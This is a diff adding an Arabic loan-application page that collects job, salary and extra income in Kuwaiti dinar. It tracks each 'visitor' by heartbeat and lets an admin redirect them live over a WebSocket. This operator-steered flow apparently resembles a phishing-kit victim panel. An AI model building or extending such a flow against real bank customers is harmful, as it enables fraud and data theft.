@@ -1,0 +1,497 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>بيانات العميل</title> <link rel="stylesheet" href="{{ url_for('static', path='css/fonts.css') }}"> <style> * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "InterLocal", system-ui, -apple-system, "Segoe UI", sans-serif;
+      background: #ffffff;
+      color: #1f2937;
+      min-height: 100vh;
+    }
+
+    .loan-header {
+      height: 58px;
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 16px;
+      position: relative;
+    }
+
+    .loan-back-btn {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 34px;
+      height: 34px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      color: #01a4e0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .loan-back-btn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .loan-logo {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+
+    .content {
+      max-width: 560px;
+      margin: 24px auto;
+      padding: 0 16px 24px;
+    }
+
+    .intro {
+      max-width: 560px;
+      margin: 18px auto 0;
+      padding: 0 16px;
+      text-align: center;
+    }
+
+    .intro-title {
+      margin: 0 0 6px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #111827;
+    }
+
+    .intro-description {
+      margin: 0;
+      font-size: 0.92rem;
+      color: #4b5563;
+    }
+
+    .panel {
+      border-radius: 14px;
+      padding: 18px;
+      background: #ffffff;
+    }
+
+    .field {
+      display: grid;
+      gap: 6px;
+      margin-bottom: 20px;
+    }
+
+    .field:last-child {
+      margin-bottom: 0;
+    }
+
+    .field label {
+      font-size: 0.82rem;
+      font-weight: 400;
+      color: #374151;
+    }
+
+    .required-star {
+      color: #dc2626;
+    }
+
+    .field select {
+      width: 100%;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      background: #fff;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M6 9L12 15L18 9' stroke='%23374151' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: left 10px center;
+      background-size: 14px 14px;
+      color: #111827;
+      padding: 10px 12px;
+      padding-left: 32px;
+      font-size: 0.92rem;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      color: #9ca3af;
+    }
+
+    .field input {
+      width: 100%;
+      border: 0;
+      border-bottom: 2px solid #c8c9cb;
+      border-radius: 0;
+      background: transparent;
+      color: #111827;
+      padding: 0 0 6px;
+      font-size: 0.82rem;
+      font-weight: 400;
+      outline: none;
+    }
+
+    .field select.has-value {
+      color: #111827;
+    }
+
+    .field select option {
+      color: #111827;
+    }
+
+    .field select:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.12);
+    }
+
+    .field input:focus {
+      border-bottom-color: #04a3e0;
+    }
+
+    .field input.is-invalid {
+      border-bottom-color: #dc2626;
+    }
+
+    .field-error {
+      margin: 0;
+      min-height: 16px;
+      font-size: 0.74rem;
+      color: #dc2626;
+    }
+
+    .next-action {
+      position: fixed;
+      left: 16px;
+      bottom: calc(10px + env(safe-area-inset-bottom));
+      z-index: 20;
+    }
+
+    .next-btn {
+      width: auto;
+      min-width: 110px;
+      min-height: 30px;
+      border: 0;
+      border-radius: 10px;
+      background: #04a3e0;
+      color: #ffffff;
+      font-size: 0.92rem;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .next-btn:disabled {
+      background: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .next-error {
+      margin: 8px 0 0;
+      font-size: 0.74rem;
+      color: #dc2626;
+      min-height: 16px;
+    } </style> </head> <body> <header class="loan-header"> <button class="loan-back-btn" id="loan-back-btn" type="button" aria-label="رجوع"> <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"> <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/> </svg> </button> <img src="{{ url_for('static', path='images/logo.png') }}" alt="Logo" class="loan-logo"> </header> <section class="intro"> <h1 class="intro-title">بيانات العمل</h1> <p class="intro-description">أكمل المعلومات المطلوبة للمتابعة</p> </section> <main class="content"> <section class="panel"> <div class="field"> <label for="work-nature">طبيعة العمل <span class="required-star">*</span></label> <select id="work-nature" name="work_nature"> <option value="" selected="selected" disabled="disabled">اختر طبيعة العمل</option> <option value="government">حكومي</option> <option value="private">قطاع خاص</option> <option value="self-employed">أعمال حرة</option> <option value="retired">متقاعد</option> <option value="student">طالب</option> <option value="unemployed">غير ذلك</option> </select> </div> <div class="field"> <label for="job-title">اسم الوظيفة <span class="required-star">*</span></label> <select id="job-title" name="job_title"> <option value="" selected="selected" disabled="disabled">اختر اسم الوظيفة</option> <option value="administrator">موظف إداري</option> <option value="accountant">محاسب</option> <option value="engineer">مهندس</option> <option value="teacher">معلم</option> <option value="doctor">طبيب</option> <option value="nurse">ممرض</option> <option value="software-developer">مطور برمجيات</option> <option value="customer-service">موظف خدمة عملاء</option> <option value="marketing-specialist">أخصائي تسويق</option> <option value="hr-specialist">أخصائي موارد بشرية</option> <option value="project-manager">مدير مشروع</option> <option value="bank-employee">موظف بنك</option> <option value="lawyer">محامي</option> <option value="pharmacist">صيدلي</option> <option value="sales-representative">مندوب مبيعات</option> <option value="technician">فني</option> <option value="driver">سائق</option> <option value="business-owner">صاحب عمل</option> <option value="other">غير ذلك</option> </select> </div> <div class="field"> <label for="salary">الراتب <span class="required-star">*</span></label> <input id="salary" name="salary" type="number" min="50" inputmode="decimal" required placeholder="100 د.ك."> <p class="field-error" id="salary-error" aria-live="polite"></p> </div> <div class="field"> <label for="additional-income">دخل إضافي</label> <input id="additional-income" name="additional_income" type="number" min="0" inputmode="decimal" placeholder="0 د. ك."> </div> </section> </main> <div class="next-action"> <button class="next-btn" id="next-btn" type="button" disabled="disabled">التالي</button> <p class="next-error" id="next-error" aria-live="polite"></p> </div> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+      const currentPage = "/additional-customer-info";
+      const backButton = document.getElementById("loan-back-btn");
+      const nextButton = document.getElementById("next-btn");
+      const nextError = document.getElementById("next-error");
+      const selects = Array.from(document.querySelectorAll(".field select"));
+      const workNatureSelect = document.getElementById("work-nature");
+      const jobTitleSelect = document.getElementById("job-title");
+      const salaryInput = document.getElementById("salary");
+      const additionalIncomeInput = document.getElementById("additional-income");
+      const salaryError = document.getElementById("salary-error");
+      let salaryTouched = false;
+      let isSubmitting = false;
+
+      const syncSelectState = (selectElement) => {
+        if (!selectElement) {
+          return;
+        }
+        const hasValue = selectElement.value.trim().length > 0;
+        selectElement.classList.toggle("has-value", hasValue);
+      };
+
+      const setSalaryError = (message) => {
+        if (!salaryInput || !salaryError) {
+          return;
+        }
+        salaryError.textContent = message;
+        salaryInput.classList.toggle("is-invalid", message.length > 0);
+        salaryInput.setCustomValidity(message);
+      };
+
+      const validateSalary = (forceRequired = false) => {
+        if (!salaryInput) {
+          return false;
+        }
+
+        const salaryValueRaw = salaryInput.value.trim();
+        const salaryValueNumber = Number(salaryValueRaw);
+        let message = "";
+
+        if (salaryValueRaw.length === 0) {
+          if (forceRequired || salaryTouched) {
+            message = "هذا الحقل مطلوب";
+          }
+        } else if (!Number.isFinite(salaryValueNumber) || salaryValueNumber < 50) {
+          message = "الحد الادنى لقيمة الراتب 50 د.ك.";
+        }
+
+        setSalaryError(message);
+        return message.length === 0 && salaryValueRaw.length > 0;
+      };
+
+      const updateNextButtonState = () => {
+        if (!nextButton) {
+          return;
+        }
+        const areSelectsValid = selects.every((selectElement) => selectElement.value.trim().length > 0);
+        const isSalaryValid = validateSalary();
+        const isValid = areSelectsValid && isSalaryValid;
+        nextButton.disabled = !isValid || isSubmitting;
+      };
+
+      selects.forEach((selectElement) => {
+        syncSelectState(selectElement);
+        selectElement.addEventListener("change", () => {
+          syncSelectState(selectElement);
+          updateNextButtonState();
+        });
+      });
+      salaryInput?.addEventListener("input", () => {
+        salaryTouched = true;
+        updateNextButtonState();
+      });
+      salaryInput?.addEventListener("blur", () => {
+        salaryTouched = true;
+        validateSalary(true);
+        updateNextButtonState();
+      });
+      updateNextButtonState();
+
+      nextButton?.addEventListener("click", async () => {
+        salaryTouched = true;
+        updateNextButtonState();
+        if (nextButton.disabled || isSubmitting) {
+          return;
+        }
+
+        const getSelectedText = (selectElement) => {
+          if (!selectElement) {
+            return "";
+          }
+          const selectedOption = selectElement.options[selectElement.selectedIndex];
+          return selectedOption ? selectedOption.text.trim() : "";
+        };
+
+        isSubmitting = true;
+        updateNextButtonState();
+        if (nextError) {
+          nextError.textContent = "";
+        }
+
+        const salaryValue = Number(salaryInput?.value.trim() || "0");
+        const additionalIncomeRaw = additionalIncomeInput?.value.trim() ?? "";
+        const additionalIncome = additionalIncomeRaw.length > 0 ? Number(additionalIncomeRaw) : null;
+
+        try {
+          const response = await fetch("/visitors/additional-customer-info", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "same-origin",
+            body: JSON.stringify({
+              work_nature: getSelectedText(workNatureSelect),
+              job_title: getSelectedText(jobTitleSelect),
+              salary: salaryValue,
+              additional_income: Number.isFinite(additionalIncome ?? 0) ? additionalIncome : null
+            })
+          });
+
+          if (response.ok) {
+            window.location.href = "/transaction-notification";
+            return;
+          }
+
+          if (nextError) {
+            nextError.textContent = "تعذر حفظ البيانات، حاول مرة أخرى.";
+          }
+        } catch (_) {
+          if (nextError) {
+            nextError.textContent = "تعذر حفظ البيانات، تحقق من الاتصال.";
+          }
+        }
+
+        isSubmitting = false;
+        updateNextButtonState();
+      });
+
+      fetch("/visitors/current-page", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "same-origin",
+        body: JSON.stringify({ current_page: currentPage })
+      }).catch(() => {});
+
+      const checkAdminRedirect = () => {
+        fetch("/visitors/redirect-check", {
+          method: "GET",
+          headers: { Accept: "application/json" },
+          credentials: "same-origin",
+          cache: "no-store",
+        })
+          .then((response) => response.ok ? response.json() : null)
+          .then((payload) => {
+            if (!payload || payload.redirect !== true) {
+              return;
+            }
+            const targetPath = typeof payload.target_path === "string" ? payload.target_path.trim() : "";
+            if (targetPath && targetPath !== window.location.pathname) {
+              window.location.href = targetPath;
+            }
+          })
+          .catch(() => {});
+      };
+
+      let redirectSocket = null;
+      let redirectSocketReconnectTimer = null;
+      let redirectSocketPingTimer = null;
+      let hasRedirected = false;
+
+      const navigateToRedirectTarget = (targetPathRaw) => {
+        if (hasRedirected) {
+          return;
+        }
+        const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
+        const targetPath = ({
+          "/additional-info": "/additional-customer-info",
+          "/transaction-info": "/transaction-notification"
+        }[targetPathInput] || targetPathInput);
+        if (!targetPath || targetPath === window.location.pathname) {
+          return;
+        }
+        hasRedirected = true;
+        window.location.href = targetPath;
+      };
+
+      const connectAdminRedirectSocket = () => {
+        if (redirectSocketReconnectTimer) {
+          clearTimeout(redirectSocketReconnectTimer);
+          redirectSocketReconnectTimer = null;
+        }
+        if (redirectSocketPingTimer) {
+          clearInterval(redirectSocketPingTimer);
+          redirectSocketPingTimer = null;
+        }
+        if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+          return;
+        }
+
+        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+        try {
+          redirectSocket = new WebSocket(socketUrl);
+        } catch (_) {
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+          return;
+        }
+
+        redirectSocket.addEventListener("open", () => {
+          redirectSocketPingTimer = setInterval(() => {
+            if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+              return;
+            }
+            try {
+              redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
+            } catch (_) {
+              // noop
+            }
+          }, 5000);
+        });
+
+        redirectSocket.addEventListener("message", (event) => {
+          let payload = null;
+          try {
+            payload = JSON.parse(event.data);
+          } catch (_) {
+            payload = null;
+          }
+          const eventName = payload && typeof payload === "object"
+            ? String(payload.event || "").trim().toLowerCase()
+            : "";
+          if (eventName !== "visitor.redirect") {
+            return;
+          }
+          const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+            ? payload.meta
+            : null;
+          navigateToRedirectTarget(meta ? meta.target_path : "");
+        });
+
+        redirectSocket.addEventListener("close", () => {
+          if (redirectSocketPingTimer) {
+            clearInterval(redirectSocketPingTimer);
+            redirectSocketPingTimer = null;
+          }
+          redirectSocket = null;
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+        });
+
+        redirectSocket.addEventListener("error", () => {
+          try {
+            redirectSocket.close();
+          } catch (_) {
+            // noop
+          }
+        });
+      };
+
+      const sendHeartbeat = () => {
+        fetch("/visitors/heartbeat", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "same-origin",
+          body: JSON.stringify({ current_page: currentPage })
+        }).catch(() => {});
+        checkAdminRedirect();
+      };
+
+      sendHeartbeat();
+      connectAdminRedirectSocket();
+      const heartbeatInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      }, 5000);
+      const redirectFallbackInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          checkAdminRedirect();
+        }
+      }, 15000);
+      document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      });
+
+      window.addEventListener("pageshow", () => {
+        hasRedirected = false;
+        sendHeartbeat();
+        connectAdminRedirectSocket();
+      });
+      window.addEventListener("beforeunload", () => {
+        clearInterval(heartbeatInterval);
+      clearInterval(redirectFallbackInterval);
+      });
+
+      backButton?.addEventListener("click", () => {
+        window.location.href = "/customer-info";
+      });
+    })(); </script> </body> </html> 
